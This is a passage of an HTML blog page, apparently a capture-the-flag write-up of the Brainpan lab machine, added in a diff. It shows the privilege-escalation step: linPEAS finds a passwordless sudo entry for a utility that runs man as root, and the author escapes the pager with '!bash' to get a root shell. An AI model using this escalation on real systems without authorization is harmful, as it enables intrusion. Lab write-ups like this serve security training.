+<li>Enumerating using <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a> I found a file that can be ran as sudo with no password.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>╔══════════╣ Checking <span style="color:#e6db74">&#39;sudo -l&#39;</span>, /etc/sudoers, and /etc/sudoers.d
+</span></span><span style="display:flex;"><span>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> puck on this host:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User puck may run the following commands on this host:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /home/anansi/bin/anansi_util
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ol start="2">
+<li>Running this file I get prompted with</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>puck@brainpan:/tmp$ sudo /home/anansi/bin/anansi_util
+</span></span><span style="display:flex;"><span>sudo /home/anansi/bin/anansi_util
+</span></span><span style="display:flex;"><span>Usage: /home/anansi/bin/anansi_util <span style="color:#f92672">[</span>action<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Where <span style="color:#f92672">[</span>action<span style="color:#f92672">]</span> is one of:
+</span></span><span style="display:flex;"><span>  - network
+</span></span><span style="display:flex;"><span>  - proclist
+</span></span><span style="display:flex;"><span>  - manual <span style="color:#f92672">[</span>command<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>puck@brainpan:/tmp$
+</span></span></code></pre></div><p>network prints out ifconfig
+proclist prints top
+but manual runs <code>sudo man [command]</code></p>
+<ol start="3">
+<li>When we are in the the manual pager utils we can escape it by hitting <code>!command</code>. Typing <code>!bash</code> will then give us a root bash shell.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@brainpan:/usr/share/man# cd /root
+</span></span><span style="display:flex;"><span>cd /root
+</span></span><span style="display:flex;"><span>root@brainpan:/root#cat b.txt   
+</span></span><span style="display:flex;"><span>cat b.txt
+</span></span><span style="display:flex;"><span>_|                            _|                                        
+</span></span><span style="display:flex;"><span>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+</span></span><span style="display:flex;"><span>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span></span><span style="display:flex;"><span>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span></span><span style="display:flex;"><span>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+</span></span><span style="display:flex;"><span>                                            _|                          
+</span></span><span style="display:flex;"><span>                                            _|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                              http://www.techorganic.com 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@brainpan:/root# id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span></code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="http://foxmaccloud.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/FoxMaccloud">Fox Maccloud</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js" integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr&#43;gb19lZ12F8/h/HMGKqgrTh&#43;oMNaUEZPSy93w=="></script>
+
+
+
+    </body>
+</html>
